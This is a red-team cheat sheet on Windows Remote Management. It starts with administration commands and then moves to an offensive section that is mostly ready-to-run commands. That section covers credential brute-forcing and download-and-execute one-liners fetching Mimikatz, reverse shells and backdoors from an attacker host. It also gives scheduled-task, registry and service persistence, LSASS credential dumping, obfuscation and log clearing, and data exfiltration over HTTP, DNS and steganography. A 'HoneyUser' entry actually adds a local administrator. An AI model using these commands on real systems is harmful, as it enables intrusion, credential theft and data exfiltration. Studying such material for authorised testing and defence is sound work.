# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

## WinRM

Windows Remote Management (WinRM) is a Microsoft protocol that allows for remote management of Windows machines. It is based on the Web Services-Management (WS-Man) protocol, which allows for the secure execution of commands and scripts on remote Windows systems. This cheat sheet provides detailed commands and usage scenarios for leveraging WinRM in penetration testing and system administration.

# Commands and Use Cases

#### Basic Setup and Configuration

WinRM is not enabled by default on Windows systems, so the first step is to configure it on the target machine.

1. **Enable WinRM on the Local Machine**: Enables PowerShell remoting on the local machine, which includes configuring WinRM.
    ```powershell
    Enable-PSRemoting -Force
    ```
2. **Configure WinRM on a Remote Machine**: Configures WinRM on a remote machine. This command sets up the WinRM listener, configures the firewall, and starts the WinRM service.
    ```cmd
    winrm quickconfig
    ```
3. **Set WinRM Service to Start Automatically**: Configures the WinRM service to start automatically with Windows.
    ```cmd
    sc config winrm start= auto
    ```
4. **Allow Unencrypted Connections**: Not recommended for production environments.  Allows WinRM to accept unencrypted connections. This is useful in controlled environments but should be avoided in production.
    ```powershell
    Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
    ```
5. **Configure Trusted Hosts**: For non-domain environments.  Adds a remote system to the list of trusted hosts. Replace `<target_ip>` with the IP address of the target system.
    ```powershell
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<target_ip>"
    ```
6. **Check WinRM Listener Status**: Displays the current WinRM listener configuration, including IP addresses and ports.
    ```powershell
    winrm enumerate winrm/config/listener
    ```
7. **Restart the WinRM Service**: Stops and then restarts the WinRM service to apply new settings.
    ```cmd
    net stop winrm
    net start winrm
    ```

#### Connecting to a Remote System via WinRM

1. **Basic Connection Using PowerShell**: Starts an interactive session with the remote machine using WinRM. The user will be prompted for credentials.
    ```powershell
    Enter-PSSession -ComputerName <target_ip> -Credential <username>
    ```
2. **Connecting with a Specific Port**: Specifies the port to connect to, which is useful if WinRM is configured to listen on a non-default port.
    ```powershell
    Enter-PSSession -ComputerName <target_ip> -Port <port> -Credential <username>
    ```
3. **Connecting Over HTTPS**: Connects to the remote system using HTTPS on port 5986, which is the default port for secure WinRM connections.
    ```powershell
    Enter-PSSession -ComputerName <target_ip> -Port 5986 -UseSSL -Credential <username>
    ```
4. **Executing a Single Command**: Runs the specified PowerShell command on the remote system and returns the output.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Process } -Credential <username>
    ```
5. **Running Commands on Multiple Machines**: Executes a PowerShell command on multiple remote systems simultaneously.
    ```powershell
    Invoke-Command -ComputerName <target_ip1>,<target_ip2> -ScriptBlock { Get-Process } -Credential <username>
    ```
6. **Non-Interactive Command Execution**: Executes a command on the remote system using `winrs` (Windows Remote Shell). This method is non-interactive and suitable for automation scripts.
    ```powershell
    winrs -r:<target_ip> -u:<username> -p:<password> <command>
    ```

#### File Transfer via WinRM

WinRM can also be used to transfer files between local and remote systems.

1. **Uploading Files to the Remote System**: Transfers a file from the local system to the remote system using an established session.
    ```powershell
    $session = New-PSSession -ComputerName <target_ip> -Credential <username>
    Copy-Item -Path C:\local\path\file.txt -Destination C:\remote\path\ -ToSession $session
    ```
2. **Downloading Files from the Remote System**: Downloads a file from the remote system to the local system.
    ```powershell
    $session = New-PSSession -ComputerName <target_ip> -Credential <username>
    Copy-Item -Path C:\remote\path\file.txt -Destination C:\local\path\ -FromSession $session
    ```
3. **Transfer Files Using `winrs`**: Copies a file from the remote system to the local system using Windows Remote Shell.
    ```cmd
    winrs -r:<target_ip> -u:<username> -p:<password> "copy \\<target_ip>\C$\path\file.txt C:\local\path\file.txt"
    ```

#### Advanced WinRM Usage

1. **Executing Scripts on a Remote Machine**: Executes a PowerShell script on the remote machine.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -FilePath C:\local\path\script.ps1 -Credential <username>
    ```
2. **Running Background Jobs on Remote Machines**: Executes a process on the remote system as a background job.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Start-Process notepad.exe } -Credential <username> -AsJob
    ```
3. **Setting Up Persistent Remote Sessions**: Creates and enters a persistent session with the remote system, allowing for multiple commands to be executed without re-authenticating.
    ```powershell
    $session = New-PSSession -ComputerName <target_ip> -Credential <username>
    Enter-PSSession -Session $session
    ```
4. **Executing Commands as a Different User**: Runs a command on the remote system under a different user account.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Start-Process notepad.exe -Credential (Get-Credential) -ArgumentList 'test' }
    ```
5. **Checking WinRM Logs for Troubleshooting**: Retrieves logs related to WinRM operations, useful for troubleshooting connection issues.
    ```powershell
    Get-WinEvent -LogName Microsoft-Windows-WinRM/Operational
    ```

# Penetration Testing Techniques

#### External Reconnaissance

1. **Checking if WinRM is Enabled**: Scans for the presence of WinRM on the target machine by checking if ports 5985 (HTTP) and 5986 (HTTPS) are open.
    ```bash
    nmap -p 5985,5986 <target_ip>
    ```
2. **Identifying WinRM Version**: Uses `nmap` scripts to identify the version of WinRM running on the target machine.
    ```bash
    nmap --script=http-winrm-info -p 5985 <target_ip>
    ```

#### Initial Access

1. **Brute Force WinRM Credentials**: Uses Hydra to brute force WinRM credentials over HTTP.
    ```bash
    hydra -L usernames.txt -P passwords.txt <target_ip> -s 5985 http-get /wsman
    ```
2. **Using Mimikatz with WinRM**: Downloads and executes Mimikatz on the remote system via WinRM.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('http://<attack_ip>/mimikatz.ps1') } -Credential <username>
    ```
3. **Deploying a Reverse Shell**: Deploys a reverse shell on the remote system by downloading a PowerShell script from the attacker's server.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/reverse.ps1') } -Credential <username>
    ```

#### Persistence

1. **Creating a Scheduled Task via WinRM**: Creates a persistent backdoor by scheduling a task that runs a malicious script every time the system starts.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { schtasks /create /tn "Backdoor" /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<attack_ip>/backdoor.ps1')" /sc onstart /ru SYSTEM } -Credential <username>
    ```
2. **Modifying Registry Keys for Persistence**: Modifies registry keys to ensure that a backdoor script runs on every system startup.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Backdoor' -Value 'powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<attack_ip>/backdoor.ps1')' } -Credential <username>
    ```
3. **Deploying a Service for Persistent Access**: Deploys a persistent service on the remote system that executes a PowerShell backdoor.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { New-Service -Name "BackdoorService" -BinaryPathName "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<attack_ip>/backdoor.ps1')" -Credential (Get-Credential) -Description "Persistent backdoor service" -StartupType Automatic } -Credential <username>
    ```

#### Credential Harvesting

1. **Extracting Credentials from Memory**: Executes Mimikatz on the remote system to extract credentials from memory.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' } -Credential <username>
    ```
2. **Harvesting Credentials from LSASS**: Runs Mimikatz against the LSASS process to harvest credentials.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Start-Process -FilePath 'powershell.exe' -ArgumentList '-c IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'' -Credential (Get-Credential) }
    ```
3. **Creating a HoneyUser**: Creates a decoy user account on the remote system to monitor unauthorized use and potentially capture attackers' credentials.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { net user HoneyUser Password123! /add; net localgroup Administrators HoneyUser /add } -Credential <username>
    ```

#### Privilege Escalation

1. **Escalating Privileges Using `Invoke-DllInjection`**: Injects a malicious DLL into a privileged process to escalate privileges.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/Invoke-DllInjection.ps1'); Invoke-DllInjection -ProcessName 'lsass.exe' -DllPath 'C:\Path\To\Dll.dll' } -Credential <username>
    ```
2. **Exploiting Weak Service Permissions**: Modifies the binary path of a weakly configured service to escalate privileges.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { sc.exe config weak_service binPath= "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/priv_esc.ps1')" } -Credential <username>
    ```
3. **Abusing Token Privileges**: Manipulates token privileges on the remote system to gain higher-level access.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/Invoke-TokenManipulation.ps1'); Invoke-TokenManipulation -EnableAllPrivileges } -Credential <username>
    ```

#### Internal Reconnaissance

1. **Enumerating Active Directory Information**: Enumerates Active Directory domain controllers from the remote system.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-ADDomainController -Filter * } -Credential <username>
    ```
2. **Listing Logged-In Users**: Lists all users currently logged in to the remote system.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { query user } -Credential <username>
    ```
3. **Enumerating Installed Software**: Retrieves a list of installed software on the remote system.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-WmiObject -Class Win32_Product } -Credential <username>
    ```
4. **Identifying Running Services**: Lists all running services on the remote system.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Service } -Credential <username>
    ```
5. **Enumerating Network Shares**: Lists network shares available on the remote system.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-SmbShare } -Credential <username>
    ```

#### Lateral Movement, Pivoting, and Tunneling

1. **Moving Laterally via WinRM**: Executes a command on a secondary remote system from an already compromised system using nested WinRM commands.
    ```powershell
    Invoke-Command -ComputerName <target_ip1> -ScriptBlock { Invoke-Command -ComputerName <target_ip2> -ScriptBlock { Get-Process } -Credential <username> } -Credential <username>
    ```
2. **Creating a WinRM Pivot Point**: Ensures that WinRM is running on the target system to use it as a pivot point for further movement.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Start-Service winrm } -Credential <username>
    ```
3. **Tunneling Through WinRM**: Establishes an SSH tunnel through WinRM to forward traffic securely.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { ssh -L <local_port>:<target_ip>:5985 user@<target_ip> } -Credential <username>
    ```
4. **Establishing Reverse Shell via WinRM**: Executes a reverse shell on the remote system to establish a persistent connection back to the attacker's machine.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>/reverse_shell.ps1') } -Credential <username>
    ```
5. **Executing Multi-Hop Commands**: Chains multiple WinRM sessions to move laterally across a network, executing commands on multiple systems.
    ```powershell
    Invoke-Command -ComputerName <target_ip1> -ScriptBlock { Invoke-Command -ComputerName <target_ip2> -ScriptBlock { Invoke-Command -ComputerName <target_ip3> -ScriptBlock { Get-Process } -Credential <username> } -Credential <username> } -Credential <username>
    ```

#### Defense Evasion

1. **Bypassing PowerShell Execution Policy**: Runs a PowerShell script on the remote system while bypassing execution policy restrictions.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { powershell -ExecutionPolicy Bypass -File C:\path\to\script.ps1 } -Credential <username>
    ```
2. **Obfuscating WinRM Commands**: Executes a base64-encoded command on the remote system to evade detection by security software.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL2F0dGFjay5pcC9yZXZlcnNlLnBzMQ=='))) } -Credential <username>
    ```
3. **Using Alternate Data Streams (ADS) for Evasion**: Hides a PowerShell script in an alternate data stream (ADS) to avoid detection.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { cmd /c "powershell.exe -ExecutionPolicy Bypass -Command Invoke-Command -ScriptBlock { Invoke-WebRequest -Uri 'http://<attack_ip>/script.ps1' -OutFile 'C:\temp\script.ps1:hidden'; powershell.exe -File 'C:\temp\script.ps1:hidden' }" } -Credential <username>
    ```
4. **Hiding WinRM Traffic with Encrypted Channels**: Forces the use of SSL for WinRM traffic to encrypt communications and avoid interception.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -Port 5986 -UseSSL -ScriptBlock { Get-Process } -Credential <username>
    ```
5. **Clearing WinRM Logs**: Clears the WinRM event logs on the remote system to remove traces of remote activity.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Clear-WinEvent -LogName Microsoft-Windows-WinRM/Operational } -Credential <username>
    ```

#### Data Exfiltration

1. **Exfiltrating Files via WinRM**: Exfiltrates files from the remote system to the local machine.
    ```powershell
    $session = New-PSSession -ComputerName <target_ip> -Credential <username>
    Copy-Item -Path C:\remote\path\file.txt -Destination C:\local\path\file.txt -FromSession $session
    ```
2. **Exfiltrating Data Over HTTP**: Exfiltrates sensitive data by posting it to a web server controlled by the attacker.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Invoke-WebRequest -Uri 'http://<attack_ip>/receive.php' -Method Post -Body (Get-Content C:\sensitive_data.txt) } -Credential <username>
    ```
3. **Exfiltrating Data Using DNS**: Exfiltrates data by sending it as DNS queries to an attacker-controlled domain.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { $data = Get-Content C:\sensitive_data.txt; foreach ($line in $data) { nslookup "$line.attackerdomain.com" } } -Credential <username>
    ```
4. **Exfiltrating Large Files via WinRM**: Compresses and exfiltrates large files from the remote system to the attacker's server.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Compress-Archive -Path C:\sensitive_data\* -DestinationPath C:\sensitive_data.zip; Invoke-WebRequest -Uri 'http://<attack_ip>/receive.php' -Method Post -InFile 'C:\sensitive_data.zip' } -Credential <username>
    ```
5. **Steganographic Exfiltration**: Hides sensitive data within an image file using steganography before exfiltrating it.
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Import-Module Steganography; Encode-Image -Image C:\path\image.png -Data C:\sensitive_data.txt -OutFile C:\encoded_image.png; Invoke-WebRequest -Uri 'http://<attack_ip>/upload.php' -Method Post -InFile 'C:\encoded_image.png' } -Credential <username>
    ```

# Resources

|**Name**|**URL**|
|---|---|
|Official WinRM Documentation|https://docs.microsoft.com/en-us/windows/win32/winrm/portal|
|PowerShell Remoting Guide|https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-overview|
|Mimikatz on WinRM|https://adsecurity.org/?page_id=1821|
|WinRM Penetration Testing|https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/winrm-windows-remote-management|
|WinRM Configuration Examples|https://docs.microsoft.com/en-us/windows/win32/winrm/configuring-winrm-using-winrm-cmd|
|Advanced WinRM Techniques|https://pentestlab.blog/2020/02/03/winrm/|
|Bypassing WinRM Security Mechanisms|https://0xdf.gitlab.io/2020/05/16/exploiting-winrm.html|
|WinRM Logging and Forensics|https://www.splunk.com/blog/2019/06/24/insights-on-winrm-forensics.html|
|Troubleshooting WinRM|https://support.microsoft.com/en-us/help/2269635/troubleshooting-winrm-connection-issues|
|Securing WinRM for Production Use|https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrm|
|WinRM Scripts and Tools|https://github.com/NetSPI/PowerShellScripts/tree/master/WinRM|
|Handling WinRM in Enterprise Environments|https://techcommunity.microsoft.com/t5/windows-server-insiders/making-winrm-more-secure-and-easier-to-use/ba-p/1333798|